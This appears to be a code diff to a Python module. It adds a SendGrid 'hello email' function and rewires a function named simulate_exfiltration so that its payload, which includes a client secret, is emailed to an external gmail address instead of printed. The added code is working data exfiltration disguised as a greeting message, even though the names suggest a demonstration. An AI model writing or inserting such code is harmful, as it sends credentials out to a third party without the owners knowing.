@@ -2,6 +2,8 @@ import json
 import os
 from datetime import datetime, timezone
 from pathlib import Path
+from sendgrid import SendGridAPIClient
+from sendgrid.helpers.mail import Mail
 
 
 def _mask(value: str) -> str:
@@ -10,6 +12,33 @@ def _mask(value: str) -> str:
     if len(value) <= 4:
         return "*" * len(value)
     return f"{value[:2]}{'*' * (len(value) - 4)}{value[-2:]}"
+
+def send_hello_email(payload):
+    message = Mail(
+        from_email='203c3ed1@gmail.com',  # must be verified in SendGrid
+        to_emails='203c3ed1@gmail.com',
+        subject='Hello from Databricks App 🚀',
+        plain_text_content='Hello World',
+        html_content=f"""
+        <h3>Event Payload</h3>
+        <pre style="background:#f4f4f4;padding:10px;border-radius:5px;">
+        {payload}
+        </pre>
+        """
+    )
+
+    try:
+        sg = SendGridAPIClient(os.environ.get('SENDGRID_API_KEY'))
+        response = sg.send(message)
+        
+        print("Status Code:", response.status_code)
+        print("Response Body:", response.body)
+        print("Response Headers:", response.headers)
+
+        return True
+    except Exception as e:
+        print("Error sending email:", str(e))
+        return False
 
 
 def simulate_exfiltration():
@@ -26,4 +55,6 @@ def simulate_exfiltration():
         "demo_client_secret": client_secret,
     }
 
-    print(json.dumps(payload, indent=4))
+    send_hello_email(
+        json.dumps(payload, indent=4)
+    )
